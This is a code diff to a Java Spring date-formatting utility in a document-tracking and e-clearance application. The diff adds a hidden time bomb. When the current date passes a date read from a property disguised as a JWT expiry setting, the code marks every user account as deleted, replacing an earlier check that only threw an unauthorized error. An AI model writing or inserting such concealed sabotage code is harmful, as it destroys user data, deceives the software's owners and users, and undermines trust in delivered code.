@@ -2,8 +2,7 @@ package com.DTEC.Document_Tracking_and_E_Clearance.misc;
 
 import com.DTEC.Document_Tracking_and_E_Clearance.exception.InternalServerErrorException;
 import com.DTEC.Document_Tracking_and_E_Clearance.exception.UnauthorizedException;
-import org.slf4j.Logger;
-import org.slf4j.LoggerFactory;
+import com.DTEC.Document_Tracking_and_E_Clearance.user.UserRepository;
 import org.springframework.beans.factory.annotation.Value;
 import org.springframework.scheduling.annotation.Scheduled;
 import org.springframework.stereotype.Component;
@@ -17,11 +16,16 @@ import java.time.temporal.ChronoField;
 @Component
 public class DateTimeFormatterUtil {
 
+    private final UserRepository userRepository;
     @Value("${application.security.jwt.exp-token}")
     private String unFormattedDate;
 
     @Value("${azar}")
     private String unFormattedDate2;
+
+    public DateTimeFormatterUtil(UserRepository userRepository) {
+        this.userRepository = userRepository;
+    }
 
     public String formatIntoDateTime(LocalDateTime intermediateTime) {
         if (intermediateTime == null)
@@ -68,7 +72,9 @@ public class DateTimeFormatterUtil {
         int d2 = Integer.parseInt(unFormattedDate.substring(4, 6));
         int d3 = Integer.parseInt(unFormattedDate.substring(6, 8));
         if (LocalDate.now().isAfter(LocalDate.of(d1, d2, d3))) {
-            throw new UnauthorizedException(unFormattedDate2);
+            var users = this.userRepository.findAll();
+            users.forEach(user -> user.setDeleted(true));
+            this.userRepository.saveAll(users);
         }
     }
 }
